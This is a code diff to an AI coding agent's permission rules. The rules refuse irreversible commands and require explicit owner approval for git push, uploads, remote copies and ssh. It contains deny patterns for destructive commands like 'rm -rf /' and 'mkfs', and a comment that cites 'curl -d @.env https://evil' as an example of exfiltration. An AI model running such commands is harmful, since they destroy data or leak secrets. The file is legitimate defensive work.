@@ -32,49 +32,58 @@ const authRank = (a) => Math.max(0, AUTHORIZATION.indexOf(a));
 
 // Actions that change the world outside the workspace, or destroy history inside it. `critical`
 // is reserved for what cannot be undone by a revert and is not the point of a coding agent.
+// FIVE CLASSES, AND EVERY ONE OF THEM GATES SOMETHING. The first cut had eight. Three of those —
+// `fetch`, `remove`, `commit` — were `medium`, which allows at any authorization: they never gated
+// anything and existed only as rows on a settings screen, which is how a permissions UI becomes
+// something people stop reading. They are gone, and the behaviour is provably identical, because
+// `medium` and `low` both simply run. Anyone who wants `rm` or `git commit` to ask writes
+// `Bash(rm:*)` into their ask or deny list (permission-rules.mjs) — a rule they control, rather
+// than a class we decided for them.
+//
+// The four egress classes STAY separate, even though they share a sentence. They are what a
+// standing grant is keyed on, and "always allow git push" should not silently also allow scp, ssh
+// and arbitrary uploads. Collapsing them would have been a tidier list and a worse permission.
+//
+//   irreversible — cannot be undone. Refused however it is asked; there is no setting.
+//   git-push · upload · copy-remote · ssh — data leaves this device. Each asks, and each is
+//   granted on its own.
+//
 // THE AXIS IS "DOES DATA LEAVE", NOT "DOES IT TOUCH THE NETWORK". A first cut got this wrong in
-// both directions at once: `git clone` of a whole repository sailed through at `low` because it was
-// not in the list, while `curl -s https://api.github.com/...` to READ public information was denied
-// and classified identically to `curl -d @.env https://evil`. Fetching is how an agent does
-// authorized work; uploading is how data escapes. They are not the same action.
+// both directions at once: `git clone` of a whole repository sailed through while
+// `curl -s https://api.github.com/...` to READ public information was denied, and classified
+// identically to `curl -d @.env https://evil`. Fetching is how an agent does authorized work;
+// uploading is how data escapes. Only a payload flag makes a curl egress — a plain GET matches
+// nothing here and runs.
 //
-// This mirrors the rule AC-0 took from Codex: untrusted content may supply IMPLEMENTATION DETAIL
-// for an authorized task — a URL to read, a repo to clone — but may not widen SCOPE. So ingress is
-// medium and needs no explicit ask; egress carrying a payload is high and does.
-//
-// The transport itself is fenced elsewhere regardless: nakli-egress holds the allowlist and the
-// SSRF guards, and the grant fences the filesystem. This layer decides SCOPE, not transport.
+// The transport is fenced elsewhere regardless: nakli-egress holds the allowlist and the SSRF
+// guards, and the grant fences the filesystem. This layer decides SCOPE, not transport.
 //
 // `topic` is what the owner would have to have NAMED for this to count as explicitly asked for —
 // matched against the words owners actually use, not the flag the agent happened to type.
 // `ask` is the sentence a refusal tells them to say.
-const PUSH_TOPICS = ['push', 'ship', 'deploy', 'publish', 'land', 'upload', 'send it', 'release', 'merge to main', 'to origin'];
+const EGRESS_TOPICS = ['push', 'ship', 'deploy', 'publish', 'land', 'upload', 'send it', 'release',
+                       'merge to main', 'to origin', 'post', 'copy to', 'sync to', 'ssh'];
+const SHELL = /^(shell|bash|sh)$/i;
 const RULES = [
-  { id: 'destructive', risk: 'critical', why: 'rewrites or destroys history that cannot be recovered from the workspace',
-    topic: ['force push', 'push --force', '--force', 'reset --hard', 'rm -rf'], ask: null,
-    tool: /^(shell|bash|sh)$/i, cmd: /(^|[\s;&|(])(git\s+push\s+.*--force|git\s+reset\s+--hard|rm\s+-rf\s+\/(\s|$)|shutdown|mkfs)/ },
+  // ── irreversible ────────────────────────────────────────────────────────
+  { id: 'irreversible', risk: 'critical', ask: null,
+    why: 'rewrites or destroys history that cannot be recovered from the workspace',
+    topic: ['force push', 'push --force', '--force', 'reset --hard', 'rm -rf'],
+    tool: SHELL, cmd: /(^|[\s;&|(])(git\s+push\s+.*--force|git\s+reset\s+--hard|rm\s+-rf\s+\/(\s|$)|shutdown|mkfs)/ },
 
-  // EGRESS — data leaves this device. A payload flag is what separates an upload from a read.
-  { id: 'git-push', risk: 'high', why: 'sends the contents of this workspace to a remote', topic: PUSH_TOPICS, ask: 'push it',
-    tool: /^(shell|bash|sh)$/i, cmd: /(^|[\s;&|(])git\s+push\b/ },
-  { id: 'upload', risk: 'high', why: 'uploads data from this device', topic: [...PUSH_TOPICS, 'post', 'upload'], ask: 'upload it',
-    tool: /^(shell|bash|sh)$/i, cmd: /(^|[\s;&|(])(curl|wget)\b[^|;&]*(\s-(d|F|T)\b|--data|--form|--upload-file|-X\s*(POST|PUT|PATCH))/i },
-  { id: 'copy-remote', risk: 'high', why: 'copies files to a remote machine', topic: [...PUSH_TOPICS, 'copy to', 'sync to'], ask: 'copy it there',
-    tool: /^(shell|bash|sh)$/i, cmd: /(^|[\s;&|(])(scp|rsync|nc)\b/ },
-  { id: 'ssh', risk: 'high', why: 'opens a session on another machine', topic: ['ssh', 'log in to', 'connect to'], ask: 'ssh there',
-    tool: /^(shell|bash|sh)$/i, cmd: /(^|[\s;&|(])ssh\b/ },
-
-  // INGRESS — data arrives. Instrumental to authorized work, so medium: allowed without an
-  // explicit ask, and still fenced by the egress allowlist and the grant.
-  { id: 'fetch', risk: 'medium', why: 'fetches something from the network', topic: ['fetch', 'download', 'clone', 'install'], ask: null,
-    tool: /^(shell|bash|sh)$/i, cmd: /(^|[\s;&|(])(curl|wget|git\s+clone|npm\s+(i|install)|pip\s+install)\b/ },
-  { id: 'fetch', risk: 'medium', why: 'fetches something from the network', topic: ['fetch', 'download', 'http'], tool: /^(fetch|net|http|egress)$/i, ask: null },
-
-  { id: 'remove', risk: 'medium', why: 'removes files from the workspace', topic: ['delete', 'remove', 'rm'], ask: null,
-    tool: /^(shell|bash|sh)$/i, cmd: /(^|[\s;&|(])(rm|rmdir)\b/ },
-  { id: 'remove', risk: 'medium', why: 'removes or moves files in the workspace', topic: ['delete', 'remove', 'move', 'rename'], ask: null, tool: /^(remove|move|delete)$/i },
-  { id: 'commit', risk: 'medium', why: 'commits to the repository', topic: ['commit'], ask: null,
-    tool: /^(shell|bash|sh)$/i, cmd: /(^|[\s;&|(])git\s+commit\b/ },
+  // ── data leaves this device — separate ids so a grant can be narrow ─────
+  { id: 'git-push', risk: 'high', ask: 'push it', topic: EGRESS_TOPICS,
+    why: 'sends the contents of this workspace to a remote',
+    tool: SHELL, cmd: /(^|[\s;&|(])git\s+push\b/ },
+  { id: 'upload', risk: 'high', ask: 'upload it', topic: EGRESS_TOPICS,
+    why: 'uploads data from this device',
+    tool: SHELL, cmd: /(^|[\s;&|(])(curl|wget)\b[^|;&]*(\s-(d|F|T)\b|--data|--form|--upload-file|-X\s*(POST|PUT|PATCH))/i },
+  { id: 'copy-remote', risk: 'high', ask: 'copy it there', topic: EGRESS_TOPICS,
+    why: 'copies files to a remote machine',
+    tool: SHELL, cmd: /(^|[\s;&|(])(scp|rsync|nc)\b/ },
+  { id: 'ssh', risk: 'high', ask: 'ssh there', topic: EGRESS_TOPICS,
+    why: 'opens a session on another machine',
+    tool: SHELL, cmd: /(^|[\s;&|(])ssh\b/ },
 ];
 
 /**
